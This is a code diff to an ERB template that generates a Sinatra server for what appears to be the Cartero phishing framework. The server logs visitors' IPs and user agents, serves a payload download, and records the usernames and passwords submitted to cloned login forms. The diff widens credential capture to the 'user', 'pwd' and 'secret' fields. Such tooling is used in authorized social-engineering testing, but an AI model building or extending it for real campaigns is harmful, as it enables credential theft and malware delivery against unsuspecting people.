@@ -1,8 +1,8 @@
 class <%= self[:webserver].camelize %> < Sinatra::Base
-	
+
 	not_found do
-		puts "#{Time.now} - IP #{request.ip} PORT #{request.port} - #{request.forwarded?} - #{request.user_agent}" 
-		erb :error
+		$stdout.puts "#{Time.now} - IP #{request.ip} PORT #{request.port} - #{request.forwarded?} - #{request.user_agent}"
+		redirect to "/"
 	end
 
 	get "/image" do
@@ -12,17 +12,18 @@ class <%= self[:webserver].camelize %> < Sinatra::Base
 
   get "/click" do
   	process_info(params,request)
-		redirect to params[:url] || "<%= self[:url] %>" 
+		redirect to params[:url] || "<%= self[:url] %>"
 	end
 	<% if self[:payload] %>
-	
+
 	get "/download" do
 		process_info(params, request)
 		return_payload
 	end
 
 	<% end %>
-	get "/" do 
+
+	get "/" do
 		process_info(params,request)
 		erb :index
 	end
@@ -36,7 +37,7 @@ class <%= self[:webserver].camelize %> < Sinatra::Base
 	<% end %>
 	<% self[:forms_routes].each do |route| %>
 	<%= route[0] %> "<%=route[1]%>" do
-		puts "#{Time.now} - CREDENTIALS - IP #{request.ip} - CREDS " + params.to_s
+		$stdout.puts "#{Time.now} - CREDENTIALS - IP #{request.ip} - CREDS " + params.to_s
 		process_info(params,request)
 		process_cred(params,request)
 
@@ -47,14 +48,14 @@ class <%= self[:webserver].camelize %> < Sinatra::Base
 	private
 	<% if self[:payload] %>
 	def return_payload
-		return send_file(<%= self[:payload] %>, :disposition => :attachment)
+		return send_file(File.expand_path("<%= self[:payload] %>"), :disposition => :attachment)
 	end
-	
+
 	<% end %>
 	def return_img
-		return send_file(File.expand_path("../../../data/images/image.jpg", __FILE__), 
-			:filename => "white.jpg", 
-			:type => :jpg, 
+		return send_file(File.expand_path("../../../data/images/image.jpg", __FILE__),
+			:filename => "white.jpg",
+			:type => :jpg,
 			:disposition => :inline)
 	end
 
@@ -78,8 +79,8 @@ class <%= self[:webserver].camelize %> < Sinatra::Base
 			:ua_engine	=> ua.engine,
 			:ua_platform => ua.platform,
 			:ua_lang		=> ua.lang,
-			:username		=> params[:username] || params[:email],
-			:password		=> params[:password]
+			:username		=> params[:username] || params[:email] || params[:user],
+			:password		=> params[:password] || params[:pwd] || params[:secret]
 		)
 		creds.save!
 	end
@@ -89,27 +90,27 @@ class <%= self[:webserver].camelize %> < Sinatra::Base
 			begin
 				data = JSON.parse(Cartero::CryptoBox.decrypt(params[:key]),{:symbolize_names => true})
 			rescue RbNaCl::CryptoError
-				puts "Entity Could not be decrypt it."
+				$stdout.puts "Entity Could not be decrypt it."
 			rescue ArgumentError
-				puts "Entity Could not be parsed correctly."
+				$stdout.puts "Entity Could not be parsed correctly."
 			end
 
 			person = Person.where(:email => data[:email]).first
 
 			if person.nil?
-				begin 
+				begin
 					person = Person.new(:email => data[:email])
 					person.save!
 				rescue MongoMapper::DocumentNotValid
 					person = Person.where(:email => data[:email]).first
 				end
 			end
-			
+
 			person.campaigns << data[:subject] unless person.campaigns.include?(data[:subject])
 			person.responded << "#{request.ip}:#{request.port}" unless person.responded.include?("#{request.ip}:#{request.port}")
 			if params[:username] || params[:password]
-				person.credentials << { 
-					:username => params[:username], 
+				person.credentials << {
+					:username => params[:username],
 					:password => params[:password]
 				}
 			end
@@ -136,12 +137,10 @@ class <%= self[:webserver].camelize %> < Sinatra::Base
 			)
 
 			person.save!
-			puts "#{Time.now} - PERSON #{person.email} - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - USER_AGENT #{request.user_agent}"
+			$stdout.puts "#{Time.now} - PERSON #{person.email} - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - USER_AGENT #{request.user_agent}"
 		else
-			puts "#{Time.now} - PERSON #{"--"} - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - USER_AGENT #{request.user_agent}"
+			$stdout.puts "#{Time.now} - PERSON #{"--"} - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - USER_AGENT #{request.user_agent}"
 
 		end
 	end
 end
-
-
